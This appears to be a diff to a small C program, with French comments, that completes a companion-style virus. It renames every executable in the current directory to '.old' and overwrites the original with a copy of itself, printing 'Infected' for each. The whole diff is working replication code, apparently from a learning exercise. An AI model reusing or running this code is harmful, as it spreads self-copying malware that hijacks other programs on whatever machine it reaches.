@@ -11,6 +11,7 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <sys/stat.h>
+#include <libgen.h> 
 
 
 #define MAX 20
@@ -105,25 +106,42 @@ int est_exe(const char *fichier){
 		return 0;  
 }
 
-void duplication(char *source, const char ouvreur){
+void duplication(char *source, char *ouvreur){
 	// je rename mon programme "pg" en "pg.old"
 	char dest[100];
 	snprintf(dest, sizeof(dest), "%s.old", source);
 	rename(source, dest);
 
+	int srcf = open(ouvreur, O_RDONLY);
+	int destf = open(source, O_WRONLY | O_CREAT | O_TRUNC, 0755);
 
+	char buffer[4096];
+    ssize_t bytes;
+    while ((bytes = read(srcf, buffer, sizeof(buffer))) > 0) {
+        if (write(destf, buffer, bytes) != bytes) {
+            perror("Failed to write to copy");
+            close(srcf);
+            close(destf);
+            return;
+        }
+    }
+
+    close(srcf);
+    close(destf);
+    printf("Infected: %s -> %s\n", source, dest);
 } 
 
-void infect(const char lanceur){
+void infect(const char *lanceur){
 	DIR *rep = opendir(".");
 	if(rep != NULL){
         struct dirent * ent;
         while((ent = readdir(rep)) != NULL){
         	if(est_exe(ent->d_name)){
-				printf("%s", ent->d_name);
+				duplication(ent->d_name, lanceur);
 			}
 		}
 	}
+	closedir(rep);
 }
 
 int main(int argc, char *argv[]) {
@@ -132,7 +150,7 @@ int main(int argc, char *argv[]) {
     	char *fichiers[MAX+1];
     	fct_tmp(fichiers);
     
-    	infect(argv[0]);
+    	infect(basename(argv[0]));
     	// Je compte le nombre de fichier dans 
     	int count = 0;
     	for(int i = 0; fichiers[i] != NULL; i++){
